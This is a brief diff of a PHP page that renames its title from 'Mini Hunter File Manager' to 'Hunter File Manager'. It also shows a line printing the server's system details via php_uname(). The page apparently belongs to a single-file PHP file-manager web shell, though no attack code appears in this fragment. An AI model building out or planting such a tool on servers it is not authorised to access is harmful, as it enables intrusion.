@@ -236,7 +236,7 @@ input[type="file"], input[type="text"] {
 </head>
 <body>
 <div class="center-title">
-    <p><netepil><code><b><i>Mini Hunter File Manager</p></netepil>
+    <p><netepil><code><b><i>Hunter File Manager</p></netepil>
 </div>
 <ul>
     <li>PHP: <a style="color: #03DAC6;"><?= php_uname(); ?></a></li>
